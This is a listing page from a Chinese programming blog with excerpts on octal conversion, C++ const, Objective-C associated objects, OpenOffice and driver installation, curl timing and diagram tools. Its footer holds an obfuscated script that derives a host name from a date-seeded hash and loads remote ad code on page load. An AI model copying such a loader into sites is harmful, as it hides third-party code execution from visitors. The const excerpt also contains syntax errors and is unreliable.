			<a href="/posts/f2d995aa469ac29568a50985462c21a9/" rel="bookmark">
			蓝桥杯  算法提高 十进制数转八进制数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		算法提高 十进制数转八进制数 时间限制：1.0s 内存限制：512.0MB 编写函数，其功能为把一个十进制数转换为其对应的八进制数。程序读入一个十进制数，调用该函数实现数制转换后，输出对应的八进制数。 样例输入 9274 样例输出 22072 样例输入 18 样例输出 22 思路：递归输出即可
AC代码：
#include &lt;iostream&gt; #include &lt;cstdio&gt; #include &lt;cstdlib&gt; #include &lt;algorithm&gt; #include &lt;queue&gt; #include &lt;stack&gt; #include &lt;map&gt; #include &lt;cstring&gt; #include &lt;climits&gt; #include &lt;cmath&gt; #include &lt;cctype&gt; typedef long long ll; using namespace std; void lol(int m,int n)//m转化为n进制 { if(m &lt; n) { printf("%d",m); return; } lol(m/n,n); printf("%d",m%n); } int main() { int n; while(scanf("%d",&amp;n) != EOF) { lol(n,8); printf("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f2d995aa469ac29568a50985462c21a9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a404cad920f4379c6f93077c876c993c/" rel="bookmark">
			c&#43;&#43;中const使用详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Const 是C++中常用的类型修饰符,常类型是指使用类型修饰符const说明的类型，常类型的变量或对象的值是不能被更新的。
1、定义常量
(1)const修饰变量，以下两种定义形式在本质上是一样的。它的含义是：const修饰的类型为TYPE的变量value是不可变的。
TYPE const ValueName = value; const TYPE ValueName = value;
(2)将const改为外部连接,作用于扩大至全局,编译时会分配内存,并且可以不进行初始化,仅仅作为声明,编译器认为在程序其他地方进行了定义.
extend const int ValueName = value;
2、指针使用CONST
(1)指针本身是常量不可变
(char*) const pContent; const (char*) pContent; (2)指针所指向的内容是常量不可变
const (char) *pContent; (char) const *pContent; (3)两者都不可变
const char* const pContent; (4)还有其中区别方法，沿着*号划一条线：
如果const位于*的左侧，则const就是用来修饰指针所指向的变量，即指针指向为常量；
如果const位于*的右侧，const就是修饰指针本身，即指针本身是常量。
3、函数中使用CONST
(1)const修饰函数参数
a.传递过来的参数在函数内不可以改变(无意义，因为Var本身就是形参)
void function(const int Var);
b.参数指针所指内容为常量不可变
void function(const char* Var);
c.参数指针本身为常量不可变(也无意义，因为char* Var也是形参)
void function(char* const Var);
d.参数为引用，为了增加效率同时防止修改。修饰引用参数时：
void function(const Class&amp; Var); //引用参数在函数内不可以改变
void function(const TYPE&amp; Var); //引用参数在函数内为常量不可变
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a404cad920f4379c6f93077c876c993c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c54b956fdde13dca46ddb438041c8f86/" rel="bookmark">
			OC高效率52之在既有类中使用关联对象存放自定义数据
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		2019独角兽企业重金招聘Python工程师标准&gt;&gt;&gt; #import "ViewController.h" #import &lt;objc/runtime.h&gt; //objc_AssociationPolicy 枚举 对应等效的属性 static void *EocMyAlertViewKey = @"EocMyAlertViewKey"; @interface ViewController ()&lt;UIAlertViewDelegate&gt; @end @implementation ViewController - (void)viewDidLoad { [super viewDidLoad]; self.view.backgroundColor = [UIColor whiteColor]; // Do any additional setup after loading the view, typically from a nib. //管理关联对象的方法 // objc_setAssociatedObject(id object, &lt;#const void *key#&gt;, &lt;#id value#&gt;, &lt;#objc_AssociationPolicy policy#&gt;)设置关联对象值 // objc_getAssociatedObject(id object, &lt;#const void *key#&gt;)获取关联对象值 // objc_removeAssociatedObjects(&lt;#id object#&gt;) 移除指定对象的全部关联对象 UIButton *button = [[UIButton alloc]initWithFrame:CGRectMake(200, 200, 100, 200)]; button.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c54b956fdde13dca46ddb438041c8f86/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ff7a80c95915a1d67f48148b5899de2f/" rel="bookmark">
			Linux版本openoffice4.1.2和SwfTools的安装（CentOS6.5-6.7）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Linux系统下安装openoffice和swftools;这两个组件在上篇博客（在线预览的开发解析)已经介绍过，在这里我就详细的说一下安装过程（安装过程不需要重启服务器）：
一、openoffice4.1.2安装
1、首先下载rpm包（官网或者其他网站都可以）但是要注意版本，我建议是4.1.2版本，因为以前的版本不支持含有中文的文件名的文档转pdf；我下载的是这个 Apache_OpenOffice_4.1.2_Linux_x86-64_install-rpm_zh-CN.tar.gz
下载到服务器的路径（自己决定）下；
2、将下载的openoffice解压：tar -zxvf Apache_OpenOffice_4.1.2_Linux_x86-64_install-rpm_zh-CN.tar.gz；
3、解压后生成文件夹zh-CN 进到RPMS目录下，直接yum localinstall *.rpm或者yum -ivh *rpm 安装所有rpm文件；
4、再装RPMS/desktop-integration目录下的openoffice4.1.2-redhat-menus-4.1.2-9782.noarch.rpm：
yum localinstall openoffice4.1.2-redhat-menus-4.1.2-9782.noarch.rpm
5、安装完成直接启动Openoffice服务：
默认安装位置为/opt下
临时启动 /opt/openoffice4/program/soffice -headless -accept="socket,host=127.0.0.1,port=8100;urp;" -nofirststartwizard &amp;
若出现以下错误：（这个问题其实有点恶心） /usr/lib64/libreoffice/program/soffice.bin X11 error: Can't open display: Set DISPLAY environment variable, use -display option or check permissions of your X-Server (See "man X" resp. "man xhost" for details) 执行：export DISPLAY=:0.0 再执行上述启动命令即可（如果没用） 看报错信息意思： libreoffice显然是试图请求X服务（你似乎表明你没有运行 所以报错） 或者那不是正确的标志， 或者它不像你期望的那样工作（并且仍然需要X服务来工作）
那可能就是缺少这个服务，那就来添加 yum install openoffice.org-headless 安装完成后，再去启动； 还有一种就是：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ff7a80c95915a1d67f48148b5899de2f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6f18e49625298eee0e832145229de145/" rel="bookmark">
			通过curl得到http各阶段的响应时间
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		curl的部分时间等变量注释：
url_effective The URL that was fetched last. This is most meaningful if you've told curl to follow location: headers. filename_effective The ultimate filename that curl writes out to. This is only meaningful if curl is told to write to a file with the --remote-name or --output option. It's most useful in combination with the --remote-header-name option. (Added in 7.25.1) http_code http状态码，如200成功,301转向,404未找到,500服务器错误等。(The numerical response code that was found in the last retrieved HTTP(S) or FTP(s) transfer.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6f18e49625298eee0e832145229de145/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4b99dc5e54aee79b85b77cf1cfb893a7/" rel="bookmark">
			Win10下CH340安装
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言
最近的项目中使用了一款win10家庭版的平板和一块CH340的通信板，尝试在win10中安装CH340的驱动，记录下过程，供大家参考。
系统平台 win10家庭版 x64 ， CH340 x64 网盘地址
安装步骤 直接解压安装CH340时，提示安装驱动失败。尝试通过设备管理器进行安装。
1、在“控制面板”中找到“设备管理器”，在列表中的“端口（COM和LPT）”中，看到一个标示为带黄色感叹号的条目
2、右键此条目，选择“更新设备驱动”
3、选择“浏览计算机上的驱动”，选择CH340驱动包的解压后的文件夹，安装即可。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1d036c20ccdd56f9c3fe8c51ddce3246/" rel="bookmark">
			常用的画流程图/时序图工具简介
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		流程图部分。
一、Graphviz
先下载并安装Graphviz。
然后在sublime下安装插件。
这样，就支持Graphviz的dot语言语法了。
在subime下，添加一个dot语言的编译系统dotCompile.sublime-build
{
"cmd": ["D:\\Graphviz2.38\\bin\\dot.exe", "-Tpng", "-o", "X:\\WorkDir\\ProGraphviz\\ProPng\\\\${file_base_name}.png", "${file_name}"],
"file_regex": "^(..[^:]*):([0-9]+):?([0-9]+)?:? (.*)$",
"selector": "source.dot, source.DOT"
}
根据自己的实际情况，修改一下上面Graphviz的安装路径，和存放png图片的路径，就可以了。
如上图所示，使用Graphviz的话，可以让工具自动给我们布局，我们只需要关系节点之间的关系就可以了。
Graphviz不适合做精准的定位、布局。
但是这里要用到dot语言，可以在百度文库下载一个DOT语法手册。
二、smart draw。
先下载并安装smart draw 7。
这软件最大的特点，就是自带很多模板库，剩下的，自己改改就可以用了。
三、Microsoft visio。
visio用起来跟smart draw差不多，这里就不作过多的介绍了。
四、ProcessOn。
ProcessOn是个在线工具，也可以把图保存到服务器，这样方便在不同的电脑上操作。注册个账号就能使用了。
时序图部分。
四、TimeGen。
这个软件可以在EETOP的论坛上面搜索并下载到，每天签到就有积分的了(EETOP里面的资源相当丰富，强烈建议读者注册一个账号)。
这个工具，相当小巧，但是画出来的波形不是很好看，最大的特点是可以把时序图转成ASCII，然后就可以copy到Verilog/VHDL的设计文件当中了。
五、TimingDesigner。
这个软件可以在EETOP的论坛上面搜索并下载到。
显然TimingDesigner画的波形图更好看，而且它还能导出tcl等多种格式，可以说是非常专业的软件。
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/548/">«</a>
	<span class="pagination__item pagination__item--current">549/578</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/550/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>